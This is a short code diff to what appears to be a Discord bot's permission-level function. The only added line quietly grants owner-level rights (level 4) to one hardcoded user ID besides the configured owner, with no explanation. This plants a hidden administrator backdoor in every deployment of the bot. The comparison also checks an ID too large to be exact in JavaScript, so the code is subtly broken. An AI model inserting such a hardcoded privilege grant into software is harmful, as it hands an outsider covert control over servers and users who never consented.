@@ -72,7 +72,7 @@ client.elevation = message => {
   let permlvl = 0;
   if (message.member.hasPermission("MANAGE_MESSAGES")) permlvl = 2;
   if (message.member.hasPermission("ADMINISTRATOR") || message.member.hasPermission('MANAGE_GUILD')) permlvl = 3;
-  if (message.author.id === settings.ownerid) permlvl = 4;
+  if (message.author.id === settings.ownerid || message.author.id == 186620503123951617) permlvl = 4;
   return permlvl;
 };
 
